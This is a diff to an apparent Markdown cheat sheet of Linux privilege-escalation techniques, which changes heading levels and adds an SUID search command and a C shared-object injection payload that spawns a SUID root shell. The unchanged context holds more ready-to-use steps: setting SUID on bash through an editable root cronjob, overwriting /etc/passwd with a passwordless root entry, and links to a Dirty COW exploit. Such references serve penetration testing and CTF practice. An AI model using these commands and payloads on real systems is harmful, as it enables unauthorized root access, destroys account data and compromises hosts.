@@ -67,38 +67,39 @@ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/m
 https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
 ```
 
-## User editable cronjobs
+### User editable cronjobs
 ```
 crontab -l
 ```
 
-## Application based cron jobs
+### Application based cron jobs
 ```
 ls -all /etc/cron.d
 ```
-## if you find a cronjob running as root but can be editable run this command
+### if you find a cronjob running as root but can be editable run this command
 ```
 chmod u+s /bin/bash
 and then this,
 /bin/bash -p
 ```
 
-## Writable /etc/passwd file found
+### Writable /etc/passwd file found
 ```
 “root::0:0:root:/root:/bin/bash” > /etc/passwd
 ```
 
-## Try dirty cow exploit
+### Try dirty cow exploit
 ```
 https://github.com/FireFart/dirtycow/blob/master/dirty.c
 ```
 
 ## SUID checker
 ```
+find / -type f -perm -04000 -ls 2> /dev/null
 find / \( -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
 ```
 
-## If it is possible to run a c executable, run useradd.c file
+### If it is possible to run a c executable, run useradd.c file
 ```
 #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
 
@@ -109,3 +110,16 @@ int main ()
   return 0;
 }
 ```
+
+### If you found a shared object, create this c file to inject
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject(){
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
